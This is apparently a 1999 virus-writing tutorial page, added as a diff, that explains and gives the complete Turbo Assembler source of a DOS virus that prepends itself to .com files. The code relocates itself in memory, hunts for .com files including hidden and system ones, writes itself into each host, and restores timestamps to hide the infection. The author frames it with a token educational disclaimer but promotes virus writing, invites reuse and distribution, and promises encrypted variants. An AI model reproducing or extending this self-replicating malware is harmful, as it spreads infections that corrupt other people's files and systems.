@@ -1,0 +1,416 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Prepending COM Infectors</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<p align="center"><b><font size="+3" color="#004080">Vircom 1 ~ Prepending Com 
+  Infectors </font></b></p>
+<hr>
+<p><font size="-1">[note 1]<br>
+  <br>
+  This material is not to be used as a tool of destruction. I assembled this information 
+  as an educational resource and I would like to see it used that way.<br>
+  <br>
+  [note 2]<br>
+  <br>
+  In this tutorial I will cover the specifics of com infection. This is by no 
+  means a tutorial on assembler. Some working knowledge of assembly language will 
+  be required to fully understand this material.<br>
+  <br>
+  [note 3]<br>
+  <br>
+  This file is assembled with these switches.<br>
+  <br>
+  TASM /M VIRCOM<br>
+  TLINK /T VIRCOM<br>
+  <br>
+  [note 4]<br>
+  <br>
+  Written for Turbo Assembler, 80286 or better<br>
+  <br>
+  [note 5]<br>
+  <br>
+  Author assumes no responsibility for damage you may... [blahblahblah]</font><br>
+  <br>
+</p>
+<hr>
+<br>
+<b>In Theory</b><br>
+<br>
+The idea here is to add our virus code to the beginning of .com files, without 
+destroying the original file, and restore it after the virus is done, so it can 
+be run normally. Sound simple? It is!<br>
+<br>
+<ol>
+  <li> Move the virus to a &quot;safe location&quot; to run from.</li>
+  <li>Restore our host to xxxx:0100 for execution.</li>
+  <li>Find a new host to infect.</li>
+  <li>Copy new host into memory at end of virus.</li>
+  <li>Write virus + new host to disk.</li>
+  <li>Jump to our host at original cs:0100h<font size="4"><br>
+    </font></li>
+</ol>
+Still sound simple? good...<br>
+<hr>
+<b>In Practice</b><br>
+<br>
+First thing we will need to do is relocate the virus code in memory. DOS memory 
+is much like a book, with pages and lines. The difference is that we call our 
+pages &quot;segments&quot; and our letters are &quot;bytes&quot;. Each segment 
+is a 64k block of memory, and each offset points to a specific byte within that 
+segment. Any byte in memory can be address in the form of two 16-bit values like 
+this 04f6:0100 (segment:offset). So, in order to move our code, we will point 
+ds:si to the seg:off of the virus code, and es:di to where we are gonna put it. 
+In this case we need to make sure we copy the virus to the same offset location 
+for proper execution.<font size="4"><br>
+</font><font size="4" face="Comic Sans MS"> </font> 
+<blockquote>
+  <pre><font size="4" face="Comic Sans MS">
+</font>.model tiny				;crap for the assembler
+
+.code</pre>
+  <pre>	org	100h			;all com files load at cs:0100h</pre>
+  <pre>size	equ	offset eov - offset begin ;calculate virus size</pre>
+  <pre>begin:
+
+	call	entry			;jump past marker byte
+
+	db	'F'			;marker 
+
+entry:
+
+	push	cs			;store cs
+
+	pop	ax			;ax = cs
+
+	add	ax,	1000h		;add 1000h to cs
+
+	push	ax			;and put it
+
+	pop	es			;in es
+
+	mov	cx,	size		;number of bytes to copy
+
+	lea	si,	[begin]		;point si to beginning of virus
+
+	lea	di,	[begin]		;and destination at same offset
+
+	repnz	movsb			;move the bytes</pre>
+  <pre>The next piece of code simply creates a far jump to the code we just
+
+moved into higher memory.</pre>
+  <pre>	push	es
+
+	pop	word ptr[jmpseg]	;save segment value for jump
+
+	lea	cx,	[virus]		;cx = offset to continue from
+
+	mov	word ptr[jmpoff],cx	;save offset for jump
+
+	push	cs	cs		;save code segment</pre>
+  <pre>This is the far jump we will use to jump between code segments.  0EAh
+
+is the far jump opcode and the four bytes following are the segment
+
+and offset of destination.  The address will be written in as needed.
+
+(like above)</pre>
+  <pre>jump:
+
+	db	0eah			;opcode for a far jump
+
+jmpoff	dw	0000h			;offset of jump
+
+jmpseg	dw	0000h			;segment of jump</pre>
+  <pre>
+
+Now that we have gotten this far, we have moved ahead in memory, and
+
+stored the original code segment on the stack twice.  The next thing
+
+to do is restore our host.  This can done almost exactly the same as
+
+moving the virus, except that this time we will point es and ds both
+
+to the original code segment, and set si to the beginning of the host
+
+(at end of the virus), and di to the initial entry point at cs:0100h.
+
+
+
+virus:
+
+	pop	es	ds		;original cs into es and ds
+
+	lea	si,	[eov]		;si = host
+
+	mov	di,	0100h		;di = entry point
+
+	mov	cx,	0ffffh		;number of bytes to move
+
+	sub	cx,	size
+
+	repnz	movsb			;move those bytes</pre>
+  <pre>The rest of what we are going to do for a while is only going to 
+
+involve the current segment, so we set DS and ES to the current
+
+code segment value.
+
+	</pre>
+  <pre>	push	cs	cs
+
+	pop	ds	es</pre>
+  <pre>Now we will set a new DTA so that we will not destroy the data in
+
+our host's dta.
+
+	</pre>
+  <pre>	mov	ah,	1ah		;DOS command to set dta
+
+	lea	dx,	[dta]		;ds:dx = seg:off of new dta
+
+	int	21h			;call DOS</pre>
+  <pre>Before we can infect a file, we have to find one.  This is done using
+
+int 21h ah = 4eh, and 4fh.  To find the first we use 4eh, next is 4fh.
+
+The file to look for must be an asciz value slored at a location 
+
+pointed to by ds:dx. CX must contain the attributes the file may have.
+
+00 = normal file, we will use 07h, it finds hidden/system/read only.
+
+And for a filename to look for, we will use wilcard *.com to find
+
+any com file.</pre>
+  <pre>	mov	ah,	4eh		;DOS command to find first file
+
+	mov	cx,	07h		;attribs to look for
+
+	lea	dx,	[fmask]		;ds:dx = file name to find
+
+	int	21h			;call DOS
+
+	jc	done			;if no file is found, we send
+
+					;control on to the host file</pre>
+  <pre>The file handle we just found was stored in the dta at offset 01eh 
+
+from the start of the dta so we must load dx with [dta+01eh], and
+
+load ax with 3d02h to open it with read/write access.</pre>
+  <pre>open:
+
+	mov	ax,	3d02h		;3d is value for DOS function
+
+					;&quot;open&quot;, and 02h is for R/W 
+
+	lea	dx,	[dta+01eh]	;file handle is here
+
+	int	21h			;call DOS</pre>
+  <pre>From this function DOS returns the file handle in AX.  Next step is
+
+to read the host file into our buffer to see if it is already infected
+
+or if it is over 64k (in which case we cant infect it).  We need the
+
+handle in BX, so first we exchange the values of ax and bx.</pre>
+  <pre>	xchg	bx,	ax</pre>
+  <pre>Before we change anything, we are gonna get and save the file's 
+
+original time/date stamp so we can restore it.</pre>
+  <pre>	mov	ax,	5700h		;DOS command to get file's
+
+					;time/date
+
+	int	21h			;call DOS
+
+	mov	word ptr [time],cx	;save time stamp
+
+	mov	word ptr [time+2],dx	;save date stamp</pre>
+  <pre>The file handle is stored at BX, so we point ds:dx to the buffer where
+
+we wanna read to, load cx with the number of bytes you wanna read.
+
+The file size is stored in the DTA at offset 1ah from start of DTA.
+
+We load that value into CX, and 3fh into ah for &quot;read&quot;</pre>
+  <pre>	mov	ah,	3fh		;DOS command to read from file
+
+	push	word ptr [dta+1ah]	;file size is here
+
+	pop	cx			;move it here
+
+	push	cx			;and store it
+
+	lea	dx,	[eov]	;ds:dx = read buffer
+
+	int	21h			;call DOS</pre>
+  <pre>If the file is already infected, it will have an 'F' in the third byte.
+
+If it is larger than 64k, the first two bytes will be 'MZ'. Either 
+
+way, we will abandon the file, and go find the next, if one of these 
+
+markers is present.</pre>
+  <pre>	cmp	word ptr [eov], 'ZM'	;is it an EXE in disguise?
+
+	je	next			;if so, find the next file
+
+	cmp	byte ptr [eov+3],'F';already infected?
+
+	je	next			;if so, find the next file</pre>
+  <pre>If we are still here, then the file seems to qualify, so now we 
+
+restore the file pointer to the beginning of the file and write
+
+the virus + file combination to disk.</pre>
+  <pre>	mov	ax,	4200h		;DOS command to seek the 
+
+					;start of file
+
+	xor	dx,	dx		;zero bytes from beginning
+
+	xor	cx,	cx		
+
+	int	21h			;DOS
+
+	mov	ah,	40h		;DOS command to write to file
+
+	pop	cx			;cx = file size
+
+	add	cx,	size		;add the virus size to the
+
+					;number of bytes to write.
+
+	lea	dx,	[begin]		;ds:dx = beginning of data to
+
+					;write
+
+	int	21h			;call DOS</pre>
+  <pre>Now, before we close this file, we need to restore the time/date.
+
+stamp.  A bunch of com files all dated in the last week are will
+
+surely reveal the virus, AND which files are infected.  We saved 
+
+this info near the end of the virus.</pre>
+  <pre>	mov	cx,	word ptr [time]	;get the original time
+
+	mov	dx,	word ptr [time+2];get the original date
+
+	mov	ax,	5701		;DOS command to set file time
+
+	int	21h			;call DOS</pre>
+  <pre>close the file...</pre>
+  <pre>	mov	ah,	3eh		;DOS command to close file
+
+	int	21h			;call DOS</pre>
+  <pre>The infection process is done.  Now we clear out the registers, reset
+
+the dta, and return control to the host program.
+
+	</pre>
+  <pre>done:
+
+	mov	ax,	0100h		;ax = 0100h
+
+	push	ax			;
+
+	pop	word ptr cs:[jmpoff]	;save 100h as offset for jump
+
+	push	cs			;save code segment
+
+	pop	ax			;ax = cs
+
+	sub	ax,	1000h		;adjust ax to orig cs value
+
+	push	ax	ax		;save it twice
+
+	pop	es	ds		;ax = es = ds
+
+	mov	ah,	1ah		;DOS command to set dta
+
+	mov	dx,	80h		;ds:dx = orig cs:0080h
+
+	int	21h			;DOS
+
+	xor	dx,	dx		;dx = 00
+
+	push	dx	dx		;save it twice
+
+	pop	cx	bx		;cx = dx = bx
+
+	push	ds			;save ds
+
+	pop	word ptr cs:[jmpseg]	;as segment for jump
+
+	jmp	dword ptr cs:[jmpoff]	;jump to host</pre>
+  <pre>This is the routine that will find another com file, if the first one
+
+found is not a good candidate for infection. Same as the find first
+
+routine, except that here ah = 4eh</pre>
+  <pre>next:
+
+	mov	ah,	4fh		;DOS command to find next file
+
+	mov	cx,	07h		;these attributes
+
+	lea	dx,	[fmask]		;this file
+
+	int	21h			;call DOS
+
+	jc	done			;didnt find any? then quit
+
+	jmp	open			;go to open it</pre>
+  <pre>fmask	db	'*.com',00h		;files to look for
+
+dta	db	2ch 	dup (?)		;disk transfer address
+
+time	dd	?			;stored file time/date</pre>
+  <pre>eov:					;This is where the host starts</pre>
+  <pre>	int	20h			;These two bytes get dropped
+
+					;and replaced by the host
+
+					;program
+
+	end 	begin</pre>
+</blockquote>
+<br>
+Still sound simple?!? good... read my next article Vircom 2 ~Prepending exe's<br>
+<br>
+<hr>
+<p><br>
+  In Retrospect<br>
+  <br>
+  This virus is seriously lacking in the &quot;accessories&quot; department. I 
+  was merely showing a possible technique for appending to the beginning of files. 
+  I think alot can be done with it, like infecting exe's (next article), and memory 
+  resident, encryption...<br>
+  <br>
+  This will be the first in a series of articles to be written based on this virus, 
+  and if you want to get the latest, email me, and I will send you updates as 
+  they are released. Actually, taking a second look back over the code, it seems 
+  that exe infection will be rather a minimal operation, so The next Issue will 
+  cover Encypted EXE prependers.<br>
+  <br>
+  Remember, information is mean to be free, but not ripped. You are FREE to use 
+  and distribute this code, and any accompanying files, just leave credit be where 
+  credit belongs, and most of all... <br>
+  <br>
+  ~FEAR WHAT YOU HAVE CREATED~<br>
+</p>
+<p>email me at <a href="MAILTO:compkiller@hotmail.com">compkiller@hotmail.com</a><br>
+  <br>
+  Pro-virus '99 [have you hugged yer virus today?]<br>
+  <br>
+</p>
+<hr>
+</body>
+
+</html>
+
+
